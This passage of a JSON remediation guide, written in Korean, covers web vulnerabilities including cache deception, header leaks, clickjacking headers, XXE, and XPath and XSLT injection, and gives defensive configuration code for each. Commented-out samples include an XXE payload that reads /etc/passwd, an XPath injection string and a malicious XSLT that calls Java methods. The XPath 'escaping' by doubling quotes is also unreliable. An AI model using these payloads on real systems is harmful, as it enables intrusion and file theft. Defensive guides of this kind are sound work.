    "example_code_nodejs_express": "// Express.js (Node.js) 예시\nconst express = require('express');\nconst helmet = require('helmet'); // 보안 헤더 설정을 위한 미들웨어\nconst app = express();\n\n// Helmet 미들웨어를 사용하여 X-XSS-Protection 등 다양한 보안 헤더 설정\napp.use(helmet.xssFilter());\n\n// 또는 수동으로 설정\n// app.use((req, res, next) => {\n//   res.setHeader('X-XSS-Protection', '1; mode=block');\n//   next();\n// });"
  },
  "Web Cache Deception": {
    "translated": "웹 캐시 기만 – 웹 캐시 서버의 동작을 이용하여 민감한 정보를 캐시에 저장하게 하고, 이를 통해 다른 사용자가 민감한 정보에 접근할 수 있도록 유도하는 공격",
    "description": "웹 캐시 디셉션(Web Cache Deception)은 공격자가 캐시 서버의 동작을 조작하여 특정 사용자 관련 민감 정보(예: 로그인된 페이지, 세션 정보)가 캐시되도록 한 후, 캐시된 콘텐츠를 탈취하는 공격입니다.",
    "solution_guidelines": [
      "**민감한 콘텐츠 캐싱 금지:** 사용자 세션 정보나 민감한 개인 정보가 포함된 페이지는 캐시되지 않도록 `Cache-Control: no-store, no-cache` 헤더를 설정합니다.",
      "**`Vary: Cookie` 헤더 사용:** 콘텐츠가 사용자 쿠키에 따라 달라지는 경우 `Vary: Cookie` 헤더를 사용하여 캐시가 각 쿠키 값에 대해 별도의 캐시를 생성하도록 합니다. 이는 성능에 영향을 줄 수 있으므로 신중하게 적용합니다.",
      "**정적 파일과 동적 파일 분리:** 사용자 데이터나 세션 정보가 포함되지 않는 순수 정적 파일(CSS, JS, 이미지)만 캐싱을 허용하고, 동적 콘텐츠는 캐싱을 엄격히 제한합니다.",
      "**경로 기반 캐싱 정책:** 캐시 서버(CDN, 프록시)에서 경로 기반으로 캐싱 정책을 세밀하게 제어하여 민감한 경로(`/profile`, `/dashboard`)는 캐시에서 제외합니다.",
      "**URL 재작성 규칙 검토:** 웹 서버의 URL 재작성 규칙이 사용자의 요청과 실제 파일 경로 간의 불일치를 유발하여 캐시 디셉션을 가능하게 하는지 검토합니다."
    ],
    "example_code_http_headers": "Cache-Control: no-store, no-cache, must-revalidate, proxy-revalidate\nPragma: no-cache\nExpires: 0\nVary: Cookie, Authorization\n\nCache-Control: public, max-age=31536000"
  },
  "X-AspNet-Version Response Header": {
    "translated": "X-AspNet-Version 응답 헤더 – X-AspNet-Version 헤더를 통해 사용 중인 ASP.NET의 버전이 노출됨",
    "description": "`X-AspNet-Version` HTTP 응답 헤더가 ASP.NET의 버전 정보를 노출하고 있습니다. 이 정보는 공격자가 특정 ASP.NET 버전의 알려진 취약점을 찾아 공격을 시작하는 데 사용될 수 있습니다.",
    "solution_guidelines": [
      "**`X-AspNet-Version` 헤더 제거:** `web.config` 파일에서 `enableVersionHeader=\"false\"`를 설정하여 `X-AspNet-Version` 헤더가 응답에 포함되지 않도록 합니다.",
      "**웹 서버/프록시에서 제거:** IIS 또는 리버스 프록시(Apache, Nginx)에서 outbound rules를 사용하여 이 헤더를 제거합니다.",
      "**최신 버전 유지:** ASP.NET 프레임워크를 항상 최신 보안 패치가 적용된 버전으로 유지하여, 버전 정보가 노출되더라도 알려진 취약점에 대한 노출 위험을 줄입니다."
    ],
    "example_code_aspnet_web_config": "<system.web>\n    <httpRuntime enableVersionHeader=\"false\" />\n</system.web>",
    "example_code_iis_web_config": "<system.webServer>\n  <outboundRules>\n    <rule name=\"RemoveAspNetVersion\" preCondition=\"IsAspNet\">\n      <match serverVariable=\"RESPONSE_X-AspNet-Version\" pattern=\".*\" />\n      <action type=\"Rewrite\" value=\"\" />\n    </rule>\n    <preConditions>\n      <preCondition name=\"IsAspNet\">\n        <add input=\"{RESPONSE_CONTENT_TYPE}\" pattern=\"^text/html|^application/json\" />\n      </preCondition>\n    </preConditions>\n  </outboundRules>\n</system.webServer>"
  },
  "X-Backend-Server Header Information Leak": {
    "translated": "X-Backend-Server 헤더 정보 유출 – X-Backend-Server 헤더를 통해 백엔드 서버의 이름이나 정보가 노출됨",
    "description": "`X-Backend-Server` 또는 유사한 사용자 정의 HTTP 응답 헤더가 백엔드 서버의 이름, IP 주소, 호스트명 등 내부 시스템 정보를 노출하고 있습니다. 이는 공격자가 네트워크 구성이나 특정 서버를 대상으로 공격을 시도하는 데 사용될 수 있는 민감한 정보입니다.",
    "solution_guidelines": [
      "**불필요한 내부 정보 헤더 제거:** 백엔드 서버 이름, IP 주소 등 내부 시스템 정보를 노출하는 모든 사용자 정의 헤더를 웹 서버, 프록시, 또는 애플리케이션 레벨에서 제거합니다.",
      "**리버스 프록시 활용:** 웹 서버 앞에 리버스 프록시(Nginx, Apache)나 로드 밸런서(L4 스위치, 클라우드 로드 밸런서)를 배치하여 내부 서버의 정보가 직접 노출되지 않도록 합니다.",
      "**헤더 화이트리스트:** 필요한 헤더만 허용하고, 불필요한 모든 헤더를 기본적으로 차단하는 '화이트리스트' 방식을 고려합니다.",
      "**정보 노출 최소화 원칙:** 서버가 외부에 제공하는 모든 정보를 최소화하는 것이 보안 모범 사례입니다."
    ],
    "example_code_nginx": "# Nginx 설정 예시 (프록시 시 X-Backend-Server 헤더 제거)\nproxy_hide_header X-Backend-Server;",
    "example_code_apache": "# Apache httpd.conf 또는 .htaccess 예시\n<IfModule mod_headers.c>\n    Header unset X-Backend-Server\n</IfModule>"
  },
  "X-ChromeLogger-Data (XCOLD) Header Information Leak": {
    "translated": "X-ChromeLogger-Data (XCOLD) 헤더 정보 유출 – X-ChromeLogger-Data 헤더에 디버그 정보가 포함되어 노출됨",
    "description": "`X-ChromeLogger-Data` 또는 `X-ChromeLogger-Data-JSON` HTTP 응답 헤더가 존재하며, 이는 개발자가 디버깅을 위해 Chrome Logger 확장 프로그램을 사용할 때 생성되는 정보입니다. 이 헤더는 민감한 애플리케이션 데이터, 로그 메시지, 스택 트레이스 등을 포함할 수 있어 프로덕션 환경에서 정보 유출 취약점을 유발할 수 있습니다.",
    "solution_guidelines": [
      "**프로덕션 환경에서 X-ChromeLogger-Data 헤더 제거:** 이 헤더는 개발/디버깅 목적으로만 사용되어야 합니다. 프로덕션 환경에서는 웹 서버, 프록시, 또는 애플리케이션 코드에서 `X-ChromeLogger-Data` 및 `X-ChromeLogger-Data-JSON` 헤더를 완전히 제거합니다.",
      "**디버깅 모드 비활성화:** 애플리케이션의 디버깅 모드를 프로덕션 환경에서 비활성화하여 불필요한 디버그 정보가 생성되지 않도록 합니다.",
      "**환경별 설정 분리:** 개발 및 프로덕션 환경 설정을 명확히 분리하여, 디버깅 도구 및 관련 헤더가 프로덕션 배포에 포함되지 않도록 합니다."
    ],
    "example_code_php_laravel_config": "// Laravel (PHP) 예시: Debugbar (X-Debug-Token 등 유사 헤더도 포함)\n// config/app.php 또는 .env 파일에서 APP_DEBUG=false 로 설정 (프로덕션 환경에서)\n\n// PHP (수동 제거)\n<?php\n// PHP 스크립트에서 명시적으로 헤더 제거\nheader_remove('X-ChromeLogger-Data');\nheader_remove('X-ChromeLogger-Data-JSON');\n?>",
    "example_code_nginx": "# Nginx 설정 예시\nproxy_hide_header X-ChromeLogger-Data;\nproxy_hide_header X-ChromeLogger-Data-JSON;"
  },
  "X-Content-Type-Options Header Missing": {
    "translated": "X-Content-Type-Options 헤더 누락 – X-Content-Type-Options 헤더가 'nosniff'로 설정되지 않아 MIME 타입 스니핑 공격에 취약함",
    "description": "`X-Content-Type-Options` HTTP 응답 헤더가 누락되어 있음을 나타냅니다. 이 헤더가 없으면 브라우저는 응답의 실제 `Content-Type`을 무시하고, 콘텐츠 스니핑(MIME Sniffing)을 통해 파일 형식을 추론할 수 있습니다. 이는 특히 사용자 업로드 파일이 있는 경우 XSS, 클릭재킹 등 공격에 취약해질 수 있습니다.",
    "solution_guidelines": [
      "**`X-Content-Type-Options: nosniff` 헤더 추가:** 모든 HTTP 응답에 `X-Content-Type-Options: nosniff` 헤더를 추가합니다. 이는 브라우저가 MIME 스니핑을 수행하는 것을 방지하고, 서버가 지정한 `Content-Type`을 강제합니다.",
      "**`Content-Type` 헤더 정확히 설정:** 모든 응답에 대해 올바르고 정확한 `Content-Type` 헤더를 설정합니다.",
      "**업로드된 파일 보안 강화:** 파일 업로드 기능이 있는 경우, 업로드된 파일에 대한 엄격한 형식 검증과 실행 권한 제한을 적용합니다."
    ],
    "example_code_nginx": "# Nginx 설정 예시\nadd_header X-Content-Type-Options nosniff always;",
    "example_code_apache": "# Apache httpd.conf 또는 .htaccess 예시\n<IfModule mod_headers.c>\n    Header always set X-Content-Type-Options \"nosniff\"\n</IfModule>",
    "example_code_nodejs_express": "// Express.js (Node.js) 예시\nconst express = require('express');\nconst helmet = require('helmet');\nconst app = express();\n\n// Helmet 미들웨어를 사용하여 X-Content-Type-Options 설정\napp.use(helmet.noSniff());\n\n// 또는 수동으로 설정\n// app.use((req, res, next) => {\n//   res.setHeader('X-Content-Type-Options', 'nosniff');\n//   next();\n// });"
  },
  "X-Debug-Token Information Leak": {
    "translated": "X-Debug-Token 정보 유출 – X-Debug-Token 헤더를 통해 디버그 관련 정보가 노출됨",
    "description": "`X-Debug-Token` HTTP 응답 헤더가 존재하며, 이는 주로 Symfony와 같은 PHP 프레임워크의 웹 디버그 바(Web Debug Toolbar)에서 사용됩니다. 이 토큰은 디버그 프로파일러 정보에 접근하는 데 사용될 수 있으며, 프로덕션 환경에서 노출될 경우 민감한 정보(로그, 설정, 요청/응답 데이터)가 유출될 수 있는 취약점입니다.",
    "solution_guidelines": [
      "**프로덕션 환경에서 디버그 도구 비활성화:** 웹 디버그 바와 같은 개발/디버깅 도구는 프로덕션 환경에서 완전히 비활성화되어야 합니다. 이는 `X-Debug-Token` 헤더를 포함한 모든 디버그 정보 노출을 방지합니다.",
      "**환경별 설정 분리:** 개발 및 프로덕션 환경 설정을 명확히 분리하여, 디버그 도구가 프로덕션 배포에 포함되거나 활성화되지 않도록 합니다.",
      "**웹 서버/프록시에서 헤더 제거:** 웹 서버(Apache, Nginx) 또는 리버스 프록시에서 `X-Debug-Token` 헤더를 제거하는 규칙을 추가합니다."
    ],
    "example_code_symfony_config": "# Symfony (PHP) framework configuration (config/packages/dev/web_profiler.yaml)\n# 프로덕션 환경에서는 이 번들이 로드되지 않거나, `enabled: false`로 설정되어야 합니다.\n\n# config/packages/prod/web_profiler.yaml (프로덕션에서는 비활성화)\n# web_profiler:\n#    toolbar: false\n#    intercept_redirects: false\n\n# Nginx 설정 예시\nproxy_hide_header X-Debug-Token;\nproxy_hide_header X-Debug-Token-JSON;"
  },
  "X-Frame-Options Defined via META (Non-compliant with Spec)": {
    "translated": "X-Frame-Options 메타 태그 정의 (비표준) – X-Frame-Options가 HTTP 헤더가 아닌 HTML 메타 태그로 정의되어 웹 표준에 부합하지 않고 효과가 제한적임",
    "description": "`X-Frame-Options` (XFO) 정책이 HTTP 응답 헤더가 아닌 HTML `<meta>` 태그를 통해 정의되어 있음을 나타냅니다. XFO는 클릭재킹(Clickjacking) 방지를 위해 HTTP 응답 헤더로만 지정되어야 합니다. `<meta>` 태그는 브라우저에 의해 무시되므로 클릭재킹 보호가 제공되지 않습니다.",
    "solution_guidelines": [
      "**XFO를 HTTP 응답 헤더로 설정:** `X-Frame-Options` 헤더는 반드시 웹 서버 또는 애플리케이션 레벨에서 HTTP 응답 헤더로 설정해야 합니다. `<meta>` 태그에 정의된 XFO는 제거합니다.",
      "**적절한 XFO 값 선택:**\n    * `DENY`: 페이지가 어떤 프레임 내에서도 표시되지 않도록 합니다 (가장 안전). \n    * `SAMEORIGIN`: 페이지가 동일 출처의 프레임 내에서만 표시되도록 합니다.\n    * `ALLOW-FROM uri`: 특정 URI의 프레임 내에서만 표시되도록 허용합니다 (최근에는 `Content-Security-Policy: frame-ancestors`로 대체 권장)."
    ],
    "example_code_http_header_and_removal": "X-Frame-Options: DENY",
    "example_code_nginx": "# Nginx 설정 예시\nadd_header X-Frame-Options \"DENY\" always;",
    "example_code_apache": "# Apache httpd.conf 또는 .htaccess 예시\n<IfModule mod_headers.c>\n    Header always append X-Frame-Options DENY\n</IfModule>",
    "example_code_nodejs_express": "// Express.js (Node.js) 예시\nconst express = require('express');\nconst helmet = require('helmet');\nconst app = express();\n\napp.use(helmet.frameguard({ action: 'deny' })); // 'deny' 또는 'sameorigin'"
  },
  "X-Frame-Options Setting Malformed": {
    "translated": "X-Frame-Options 설정 잘못됨 – X-Frame-Options 헤더의 설정 값이 잘못되어 클릭재킹 방어가 불완전할 수 있음",
    "description": "`X-Frame-Options` HTTP 응답 헤더의 값이 유효하지 않게 잘못 구성되어 있음을 나타냅니다. 잘못된 값은 브라우저가 XFO 정책을 제대로 적용하지 못하게 하여 클릭재킹 공격에 취약해질 수 있습니다.",
    "solution_guidelines": [
      "**XFO 헤더 구문 정확히 준수:** `X-Frame-Options` 헤더의 값은 `DENY`, `SAMEORIGIN`, `ALLOW-FROM uri` 중 하나여야 합니다. 오타, 불필요한 공백, 잘못된 구문이 없는지 확인합니다.",
      "**`ALLOW-FROM` 사용 시 주의:** `ALLOW-FROM`은 모든 브라우저에서 지원되지 않으며, `Content-Security-Policy`의 `frame-ancestors` 지시어를 사용하는 것이 더 권장됩니다.",
      "**웹 서버/애플리케이션 설정 검토:** XFO 헤더를 설정하는 웹 서버 구성 파일 또는 애플리케이션 코드에서 구문 오류를 수정합니다."
    ],
    "example_code_http_header_correct": "X-Frame-Options: DENY\nX-Frame-Options: SAMEORIGIN"
  },
  "XML External Entity Attack": {
    "translated": "XML 외부 엔티티 공격 (XXE) – XML 파서가 외부 엔티티를 처리하는 과정에서 악성 코드를 삽입하여 파일을 읽거나, SSRF 공격 등을 수행함",
    "description": "XXE(XML External Entity) 공격은 XML 파서가 외부 엔티티를 처리할 때 발생하는 취약점으로, 공격자가 외부 리소스(파일 시스템, 내부 네트워크 리소스)에 접근하거나, 서비스 거부(DoS) 공격을 유발할 수 있습니다.",
    "solution_guidelines": [
      "**XML 파서에서 DTD 및 외부 엔티티 처리 비활성화:** 모든 XML 파서에서 DTD(Document Type Definition) 및 외부 엔티티(External Entities) 처리를 명시적으로 비활성화합니다. 이는 가장 효과적인 XXE 방어책입니다.",
      "**입력 XML 유효성 검사:** XML 입력에 대해 엄격한 스키마 유효성 검사를 수행하여 예상되는 XML 구조만 허용합니다.",
      "**업데이트된 XML 라이브러리 사용:** 사용 중인 XML 파서 라이브러리를 최신 버전으로 유지하여 알려진 취약점에 대한 패치를 적용합니다.",
      "**최소 권한 원칙:** XML 파서가 실행되는 프로세스에 필요한 최소한의 파일 시스템 및 네트워크 접근 권한만 부여합니다."
    ],
    "example_code_java_xxe_prevention": "import javax.xml.parsers.DocumentBuilderFactory;\nimport javax.xml.parsers.ParserConfigurationException;\nimport org.xml.sax.SAXException;\nimport java.io.InputStream;\nimport java.io.IOException;\n\npublic class SecureXmlParser {\n    public static DocumentBuilderFactory getSecureDocumentBuilderFactory() throws ParserConfigurationException {\n        DocumentBuilderFactory dbf = DocumentBuilderFactory.newInstance();\n        \n        // **XXE 방지를 위한 핵심 설정 (모든 XML 파서에 적용)**\n        dbf.setFeature(\"http://apache.org/xml/features/disallow-doctype-decl\", true);\n        dbf.setFeature(\"http://xml.org/sax/features/external-general-entities\", false);\n        dbf.setFeature(\"http://xml.org/sax/features/external-parameter-entities\", false);\n        dbf.setFeature(\"http://apache.org/xml/features/nonvalidating/load-external-dtd\", false);\n        dbf.setXIncludeAware(false);\n        dbf.setExpandEntityReferences(false);\n        \n        return dbf;\n    }\n\n    public static void parseXmlSafely(InputStream xmlStream) {\n        try {\n            DocumentBuilderFactory dbf = getSecureDocumentBuilderFactory();\n            dbf.newDocumentBuilder().parse(xmlStream);\n            System.out.println(\"XML parsed securely. No external entity processing.\");\n        } catch (ParserConfigurationException | SAXException | IOException e) {\n            e.printStackTrace();\n        }\n    }\n}",
    "example_code_python_lxml_xxe_prevention": "from lxml import etree\n\ndef parse_secure_xml(xml_string):\n    # DTD 및 외부 엔티티를 처리하지 않도록 파서 설정\n    parser = etree.XMLParser(no_network=True, dtd_validation=False, load_dtd=False, resolve_entities=False)\n    try:\n        root = etree.fromstring(xml_string.encode('utf-8'), parser)\n        print(\"XML parsed securely:\")\n        print(etree.tostring(root, pretty_print=True).decode())\n    except etree.XMLSyntaxError as e:\n        print(f\"XML parsing error: {e}\")\n\n# 사용 예시:\n# parse_secure_xml(\"<data>Hello World</data>\")\n# # XXE 공격 시도 (차단됨)\n# # parse_secure_xml(\"\"\"\n# # <?xml version=\"1.0\"?>\n# # <!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]>\n# # <root>&xxe;</root>\n# # \"\"\")"
  },
  "XPath Injection": {
    "translated": "XPath 인젝션 – 사용자 입력이 XPath 쿼리에 삽입되어 XML 문서의 내용을 열람하거나 인증을 우회하는 공격",
    "description": "사용자 입력이 필터링되지 않은 채 XPath 쿼리에 직접 삽입되어, 공격자가 임의의 XPath 구문을 주입하여 인증 우회, 정보 유출 등 데이터베이스와 유사한 공격을 수행할 수 있는 취약점입니다.",
    "solution_guidelines": [
      "**XPath 쿼리 매개변수화 (Parameters):** 사용자 입력을 XPath 쿼리 문자열에 직접 연결하지 않고, XPath API가 제공하는 매개변수화된 쿼리 또는 바인딩 기능을 사용합니다. 이는 SQL Injection 방지와 유사합니다.",
      "**입력값 유효성 검사:** 사용자 입력에 대해 강력한 유효성 검사를 수행하여 XPath 구문으로 해석될 수 있는 특수 문자(예: `'`, `\"`, `[`, `]`, `/`, `*`, `or`, `and`, `not`)를 필터링하거나 거부합니다.",
      "**XPath API의 안전한 기능 사용:** XPath API가 제공하는 안전한 메서드를 사용하여 사용자 입력이 데이터로만 처리되도록 합니다.",
      "**오류 메시지 숨기기:** XPath 오류 메시지가 사용자에게 노출되지 않도록 일반적인 오류 메시지를 제공합니다."
    ],
    "example_code_java_xpath_injection_secure": "import org.w3c.dom.Document;\nimport org.xml.sax.InputSource;\nimport javax.xml.parsers.DocumentBuilder;\nimport javax.xml.parsers.DocumentBuilderFactory;\nimport javax.xml.xpath.*;\nimport java.io.StringReader;\n\npublic class SecureXPath {\n    public static String findUserRole(String xmlContent, String username) throws Exception {\n        DocumentBuilderFactory factory = DocumentBuilderFactory.newInstance();\n        factory.setNamespaceAware(true); // XPath namespace awareness\n        DocumentBuilder builder = factory.newDocumentBuilder();\n        Document doc = builder.parse(new InputSource(new StringReader(xmlContent)));\n\n        XPathFactory xpathFactory = XPathFactory.newInstance();\n        XPath xpath = xpathFactory.newXPath();\n\n        // **안전한 방법: 사용자 입력을 XPath 변수로 바인딩**\n        // XPathExpression expression = xpath.compile(\"//user[username=$username]/role\");\n        // VariableResolver resolver = new SimpleVariableResolver(\"username\", username);\n        // xpath.setXPathVariableResolver(resolver);\n        // return expression.evaluate(doc, XPathConstants.STRING).toString();\n\n        // 다른 안전한 방법: 사용자 입력을 직접 XPath 쿼리에 넣지 않고, 문자열 리터럴로 삽입될 수 있도록 이스케이프\n        // (단, 강력한 유효성 검사가 선행되어야 함)\n        // 이 방법은 `username`에 싱글 쿼트가 들어갈 경우 실패할 수 있으므로, 바인딩이 더 안전.\n        String safeUsername = username.replace(\"'\", \"''\"); // 싱글 쿼트 이스케이프\n        String query = \"//user[username='\" + safeUsername + \"']/role\";\n        XPathExpression expression = xpath.compile(query);\n        return expression.evaluate(doc, XPathConstants.STRING).toString();\n    }\n}",
    "example_code_python_lxml_xpath_secure": "from lxml import etree\n\ndef find_user_secure(xml_string, username):\n    root = etree.fromstring(xml_string.encode('utf-8'))\n    \n    # 안전한 방법: XPath 2.0+의 변수 바인딩(LXML은 지원하지 않음)\n    # LXML에서는 직접 변수 바인딩이 어렵기 때문에, 강력한 입력 검증 후 문자열 이스케이프 또는\n    # 데이터를 XPath 쿼리에서 직접 참조하는 것을 피해야 합니다.\n    \n    # 다른 안전한 방법: 사용자 입력을 직접 XPath 쿼리에 넣지 않고,\n    # 데이터를 필터링하거나, 노드 속성으로 비교하는 방식.\n    # 또는, 사용자 입력을 통해 검색된 노드를 다시 필터링하는 방식.\n\n    # XPath를 통한 직접적인 주입 방지는 입력 유효성 검사가 핵심.\n    # 이스케이프: ' -> ''\n    escaped_username = username.replace(\"'\", \"''\")\n    query = f\"//user[username='{escaped_username}']\"\n    \n    # select() 메서드 사용 시, xpath_evaluator 파라미터를 통해 커스텀 변수 처리 가능\n    # 그러나 일반적인 사용 시에는 강력한 입력 검증이 필수\n    \n    users = root.xpath(query)\n    if users:\n        return users[0].find('role').text\n    return None\n\n# XML 예시:\n# xml_data = \"\"\"\n# <users>\n#     <user>\n#         <username>admin</username>\n#         <role>administrator</role>\n#     </user>\n#     <user>\n#         <username>testuser</username>\n#         <role>user</role>\n#     </user>\n# </users>\n# \"\"\"\n\n# print(find_user_secure(xml_data, \"admin\"))\n# print(find_user_secure(xml_data, \"testuser' or '1'='1\")) # 방어됨"
  },
  "XSLT Injection": {
    "translated": "XSLT 인젝션 – XSLT(eXtensible Stylesheet Language Transformations) 프로세서에 악성 코드를 주입하여 XML 문서 변환 시 임의의 코드를 실행하는 공격",
    "description": "XSLT(eXtensible Stylesheet Language Transformations) 엔진이 사용자 입력이 포함된 XSLT 스타일시트를 처리할 때 발생하는 취약점입니다. 공격자는 악의적인 XSLT 코드를 주입하여 XML 데이터 변조, 임의의 파일 읽기, 임의의 명령 실행 등 심각한 공격을 수행할 수 있습니다.",
    "solution_guidelines": [
      "**신뢰할 수 없는 XSLT 스타일시트 처리 금지:** 사용자로부터 XSLT 스타일시트 자체를 입력받아 동적으로 처리하는 것을 피합니다. XSLT 스타일시트는 서버에서 미리 정의되어야 합니다.",
      "**XSLT 프로세서의 기능 제한:** XSLT 프로세서가 외부 함수 호출(`EXSLT` 또는 특정 언어의 확장 함수), 외부 문서 로드(`document()` 함수), 스크립트 실행(예: `msxsl:script`) 등을 수행하지 못하도록 비활성화합니다.",
      "**입력 XML 및 파라미터 유효성 검사:** XSLT 변환에 사용되는 XML 데이터 및 XSLT 파라미터에 대해 엄격한 유효성 검사를 수행합니다.",
      "**최신 XSLT 프로세서 라이브러리 사용:** 사용 중인 XSLT 프로세서 라이브러리를 최신 버전으로 유지하여 알려진 취약점을 패치합니다.",
      "**XXE 방지 설정:** XSLT 프로세서가 내부적으로 XML 파서를 사용하므로, XXE 공격 방지를 위한 XML 파서 설정(외부 엔티티 비활성화)을 반드시 적용합니다."
    ],
    "example_code_java_xslt_secure": "import javax.xml.transform.Transformer;\nimport javax.xml.transform.TransformerFactory;\nimport javax.xml.transform.stream.StreamSource;\nimport javax.xml.transform.stream.StreamResult;\nimport javax.xml.transform.TransformerConfigurationException;\nimport javax.xml.transform.TransformerException;\nimport java.io.StringReader;\nimport java.io.StringWriter;\n\npublic class SecureXsltTransformation {\n    public static String transformSecurely(String xmlInput, String xsltStylesheet) throws TransformerException {\n        // XML 외부 엔티티(XXE) 방지를 위한 DocumentBuilderFactory 설정 (XML External Entity Attack 섹션 참조)\n        // DocumentBuilderFactory dbf = SecureXmlParser.getSecureDocumentBuilderFactory();\n\n        TransformerFactory factory = TransformerFactory.newInstance();\n        \n        // **XSLT Injection 방지를 위한 핵심 설정**\n        // XSLT 프로세서의 외부 함수 호출, 스크립트 실행 등을 제한\n        try {\n            factory.setAttribute(javax.xml.XMLConstants.ACCESS_EXTERNAL_DTD, \"\"); // 외부 DTD 접근 금지\n            factory.setAttribute(javax.xml.XMLConstants.ACCESS_EXTERNAL_STYLESHEET, \"\"); // 외부 스타일시트 접근 금지\n            // Xalan/Saxon 등 특정 구현에 따라 추가 설정이 필요할 수 있습니다.\n            // For Xalan: factory.setAttribute(\"http://xml.apache.org/xalan/properties/allow-external-functions\", false);\n            // For Saxon: factory.setAttribute(\"http://saxon.sf.net/feature/allow-external-functions\", Boolean.FALSE);\n\n            // 스크립트 실행 비활성화\n            // factory.setFeature(\"http://xml.apache.org/xalan/features/java/enable-client-scripting\", false);\n            // factory.setFeature(\"http://apache.org/xalan/features/functions/extensions\", false);\n\n        } catch (IllegalArgumentException e) {\n            // 일부 XSLT 프로세서는 특정 속성을 지원하지 않을 수 있습니다.\n            System.err.println(\"Warning: XSLT processor does not support a security feature: \" + e.getMessage());\n        }\n\n        Transformer transformer = factory.newTransformer(new StreamSource(new StringReader(xsltStylesheet)));\n\n        StringWriter writer = new StringWriter();\n        transformer.transform(new StreamSource(new StringReader(xmlInput)), new StreamResult(writer));\n        return writer.toString();\n    }\n\n    public static void main(String[] args) throws Exception {\n        String safeXslt = \"\"\"\n        <xsl:stylesheet version=\"1.0\" xmlns:xsl=\"http://www.w3.org/1999/XSL/Transform\">\n            <xsl:template match=\"/\">\n                <output>\n                    <xsl:value-of select=\"//data\"/>\n                </output>\n            </xsl:template>\n        </xsl:stylesheet>\n        \"\"\";\n\n        String xmlData = \"<root><data>Hello World</data></root>\";\n        System.out.println(transformSecurely(xmlData, safeXslt));\n\n        // 취약한 XSLT (주입 시도, 위 보안 설정으로 차단됨)\n        // String maliciousXslt = \"\"\"\n        // <xsl:stylesheet version=\"1.0\" xmlns:xsl=\"http://www.w3.org/1999/XSL/Transform\"\n        //                 xmlns:java=\"http://xml.apache.org/xalan/java\" exclude-result-prefixes=\"java\">\n        //     <xsl:template match=\"/\">\n        //         <output>\n        //             <xsl:value-of select=\"java:java.lang.System.getProperty('os.name')\"/>\n        //         </output>\n        //     </xsl:template>\n        // </xsl:stylesheet>\n        // \"\"\";\n        // System.out.println(transformSecurely(xmlData, maliciousXslt));\n    }\n}"
  }
}